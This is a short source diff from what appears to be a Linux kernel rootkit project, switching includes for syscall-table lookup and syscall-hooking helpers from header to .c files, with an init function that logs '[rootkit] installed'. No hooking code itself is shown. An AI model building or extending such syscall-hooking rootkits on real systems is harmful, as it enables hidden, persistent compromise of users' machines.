@@ -6,9 +6,9 @@ kernel module imports
 #include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
 #include <linux/string.h>
 
-#include <custom/syscall_table.h> //functions for getting sycall syscall_table
-#include <custom/hooks.h> //functions for hooking syscalls
-#include <custom/hooked_syscalls.h> //functions of the hooked syscalls
+#include <custom/syscall_table.c> //functions for getting sycall syscall_table
+#include <custom/hooks.c> //functions for hooking syscalls
+#include <custom/hooked_syscalls.c> //functions of the hooked syscalls
 
 static int __init ModuleInit(void) {
   printk(KERN_DEBUG "[rootkit] installed\n"); //DEBUG //DEBUG logs to dmesg
